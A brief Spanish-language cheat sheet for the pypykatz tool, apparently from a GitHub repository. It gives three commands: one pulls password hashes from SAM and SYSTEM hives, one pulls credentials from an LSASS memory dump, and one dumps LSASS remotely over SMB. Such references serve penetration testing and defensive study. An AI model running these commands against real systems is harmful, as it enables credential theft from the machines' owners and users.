# pypykatz Cheat Sheet

#### Extraer Hashes de SAM & SYSTEM
```
pypykatz registry --sam <FILE-SAM> <FILE-SYSTEM>
```

#### Extraer credenciales desde un archivo de memoria
```
pypykatz lsa minidump <FILE-.dmp> -g -p wdigest
```

#### Dumperar LSASS remotamente
```
pypykatz live smb lsassdump <IP-TARGET>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)